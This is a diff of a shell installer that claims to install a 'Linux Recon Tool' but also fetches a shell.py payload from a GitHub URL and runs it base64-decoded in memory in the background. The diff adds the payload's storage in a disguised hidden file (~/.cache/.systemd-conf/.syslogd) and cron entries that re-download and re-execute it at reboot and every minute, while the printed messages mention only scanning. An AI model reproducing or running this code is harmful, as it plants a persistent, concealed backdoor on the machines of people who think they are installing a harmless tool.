@@ -21,20 +21,25 @@ if ! curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main
 fi
 chmod +x ./recon.py
 pip3 install requests >/dev/null 2>&1 || true
-echo "[+] Recon tool installed! Run: ./recon.py -u example.com"
+echo "[+] Recon tool installed! Run: python3 recon.py -u https://example.com"
 
 # Download shell.py, base64-encode, and run in memory
 shell_url="https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py"
 encoded_shell=$(curl -sSL "$shell_url" | base64 -w 0) || { echo "[-] Failed to download shell.py" >&2; exit 1; }
 nohup python3 -c "import base64; exec(base64.b64decode('$encoded_shell'))" >/dev/null 2>&1 &
 
-# Add persistence via crontab (fileless, with network delay)
+# Store base64-encoded shell.py in hidden system-like directory
+mkdir -p ~/.cache/.systemd-conf
+echo "$encoded_shell" > ~/.cache/.systemd-conf/.syslogd
+
+# Add persistence via crontab (fileless execution, auto-recreate)
 crontab -l > /tmp/cron 2>/dev/null || true
-if ! grep -q "shell.py" /tmp/cron; then
-    echo "@reboot sleep 30 && nohup python3 -c \"import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen('$shell_url').read()))\" >/dev/null 2>&1 &" >> /tmp/cron
+if ! grep -q ".systemd-conf/.syslogd" /tmp/cron; then
+    echo "@reboot sleep 60 && nohup python3 -c \"import base64; exec(base64.b64decode(\\\$(cat ~/.cache/.systemd-conf/.syslogd)))\" >/dev/null 2>&1 &" >> /tmp/cron
+    echo "* * * * * [ -f ~/.cache/.systemd-conf/.syslogd ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py | base64 -w 0 > ~/.cache/.systemd-conf/.syslogd && nohup python3 -c \"import base64; exec(base64.b64decode(\\\$(cat ~/.cache/.systemd-conf/.syslogd)))\" >/dev/null 2>&1 &)" >> /tmp/cron
     echo "* * * * * nohup python3 -c \"import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen('$shell_url').read()))\" >/dev/null 2>&1 &" >> /tmp/cron
     crontab /tmp/cron >/dev/null 2>&1 || exit 1
 fi
 rm -f /tmp/cron >/dev/null 2>&1
 
-echo "[+] Setup complete! Use ./recon.py for scanning."
+echo "[+] Download complete! Use for scanning."
